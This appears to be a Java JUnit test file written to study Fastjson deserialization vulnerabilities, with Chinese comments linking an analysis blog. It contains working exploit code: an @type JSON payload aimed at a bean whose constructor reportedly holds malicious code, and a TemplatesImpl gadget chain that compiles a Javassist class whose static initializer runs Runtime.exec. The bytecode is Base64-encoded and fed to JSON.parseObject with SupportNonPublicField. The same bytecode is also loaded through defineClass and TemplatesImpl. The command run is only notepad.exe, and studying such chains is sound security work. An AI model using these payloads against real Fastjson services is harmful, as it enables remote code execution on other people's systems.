package com.jesper.seckill;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.jesper.seckill.bean.FastJsonUser;
import com.jesper.seckill.bean.User;
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.junit.Test;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;


/**
 * @author hongxingyi
 * @description TODO FastJson 反序列化安全问题 测试时 需添加fastjson 反序列化 白名单（因为fastjson存在安全漏洞，fastjson 1.2.83后 autoType is not support）
 * @date 2022/5/27 11:31
 */

public class FastJsonSafeTest {

    //分析博客地址： https://blog.csdn.net/hongduilanjun/article/details/123534280?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-123534280-blog-123870812.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=3

    //2.反序列化漏洞分析
    @Test
    public void test1() {

        /*FastJsonUser user1 = new FastJsonUser("小李",10);
        String JsStr1= JSONObject.toJSONString(user1);
        System.out.println(JsStr1);*/

        /*FastJsonUser user2 = new FastJsonUser("大李",100);
        String JsStr2= JSONObject.toJSONString(user2, SerializerFeature.WriteClassName);
        System.out.println(JsStr2);*/

        //下面这两种会反序列化安全问题，会通过无参构造函数创建一个对象 【FastJsonUser 构造方法中已经写入自定义恶意程序】
        /*String str = "{\"@type\":\"com.jesper.seckill.bean.FastJsonUser\",\"age\":1000,\"name\":\"老李\"}";
        Object obj1 = JSONObject.parse(str);
        System.out.println(obj1);*/

        String str = "{\"@type\":\"com.jesper.seckill.bean.FastJsonUser\",\"age\":1000,\"name\":\"老李\"}";
        Object obj2 = JSONObject.parseObject(str);
        System.out.println(obj2);


    }

    @Test
    public void test() throws CannotCompileException, NotFoundException, IOException {
        ParserConfig config = new ParserConfig();
        ClassPool classPool=ClassPool.getDefault();
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections3");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"notepad.exe\");");
        String str = Base64.getEncoder().encodeToString(payload.toBytecode());
        String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+str+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}";
        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);

    }

    // 方法2.  利用defineClass加载字节码
    @Test
    public  void test2() throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException, NotFoundException, CannotCompileException, IOException {
        //通过字节码构建恶意类
        ClassPool classPool=ClassPool.getDefault();
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections3");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"notepad.exe\");");
        byte[] code=payload.toBytecode();

        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class yyds= (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "CommonsCollections3", code, 0, code.length);
        yyds.newInstance();
    }

    //方法3 利用TemplatesImpl加载字节码
    @Test
    public void test3(){
        try {
            ClassPool classPool=ClassPool.getDefault();
            String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            classPool.appendClassPath(AbstractTranslet);
            CtClass payload=classPool.makeClass("CommonsCollections3");
            payload.setSuperclass(classPool.get(AbstractTranslet));
            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"notepad.exe\");");
            byte[] codes=payload.toBytecode();

            byte[][] _bytecodes = new byte[][] {
                    codes,
            };
            TemplatesImpl templates = new TemplatesImpl();
            setFiledValue(templates, "_bytecodes", _bytecodes);
            setFiledValue(templates, "_name", "whatever");
            setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private  void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }





}
